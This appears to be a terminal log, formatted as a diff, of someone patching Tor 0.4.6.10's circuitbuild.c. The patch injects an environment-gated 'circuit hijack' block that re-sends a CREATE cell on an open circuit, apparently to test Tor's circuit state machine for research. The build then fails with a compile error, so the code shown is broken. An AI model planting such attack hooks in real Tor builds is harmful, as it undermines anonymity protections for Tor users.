@@ -1,0 +1,15 @@
+buntu:~/tor-fsm-mdt$ cd ~/tor-0.4.6.10
+grep -q "circ->n_circ_id) {" src/core/or/circuitbuild.c || perl -0pi -e 's/(  memset\(&cc, 0, sizeof\(cc\)\);\n)/$1  if (getenv("TOR_FSM_ATTACK_CIRCUIT_HIJACK") && circ->cpath && circ->cpath->state == CPATH_STATE_OPEN && circ->n_circ_id) {\n    create_cell_t hcc; onion_handshake_state_t hst; cell_t hcell; int hf, hl; const node_t *hn;\n    memset(&hcc,0,sizeof(hcc)); memset(&hst,0,sizeof(hst)); memset(&hcell,0,sizeof(hcell));\n    hn = node_get_by_id(circ->base_.n_chan->identity_digest);\n    hf = should_use_create_fast_for_circuit(circ);\n    if (!hf) circuit_pick_create_handshake(&hcc.cell_type,&hcc.handshake_type,circ->cpath->extend_info);\n    else { hcc.cell_type=CELL_CREATE_FAST; hcc.handshake_type=ONION_HANDSHAKE_TYPE_FAST; }\n    hl = onion_skin_create(hcc.handshake_type,circ->cpath->extend_info,&hst,hcc.onionskin);\n    if (hl>=0) { hcc.handshake_len=hl;\n      if (create_cell_format(&hcell,&hcc)==0) { hcell.circ_id=circ->n_circ_id;\n        append_cell_to_circuit_queue(TO_CIRCUIT(circ),circ->base_.n_chan,&hcell,CELL_DIRECTION_OUT,0);\n        log_info(LD_CIRC,"First hop: finished sending %s cell to %s", hf?"CREATE_FAST":"CREATE", hn?node_describe(hn):"<unnamed>"); } }\n    onion_handshake_state_release(&hst);\n    return 0;\n  }\n/' src/core/or/circuitbuild.c
+echo "=== yeni blok satiri ==="; grep -n "circ->n_circ_id) {" src/core/or/circuitbuild.c
+echo "=== derleme ==="; make -j$(nproc) src/app/tor 2>&1 | tail -6
+=== yeni blok satiri ===
+966:  if (getenv("TOR_FSM_ATTACK_CIRCUIT_HIJACK") && circ->cpath && circ->cpath->state == CPATH_STATE_OPEN && circ->n_circ_id) {
+=== derleme ===
+  966 |   if (getenv("TOR_FSM_ATTACK_CIRCUIT_HIJACK") && circ->cpath && circ->cpath->state == CPATH_STATE_OPEN && circ->n_circ_id) {
+      |                                                                                                               ^~
+src/core/or/circuitbuild.c:975:67: error: ‘origin_circuit_t’ has no member named ‘n_circ_id’
+  975 |       if (create_cell_format(&hcell,&hcc)==0) { hcell.circ_id=circ->n_circ_id;
+      |                                                                   ^~
+make: *** [Makefile:12140: src/core/or/circuitbuild.o] Error 1
+tez@tor-fsm-ubuntu:~/tor-0.4.6.10$ 
+
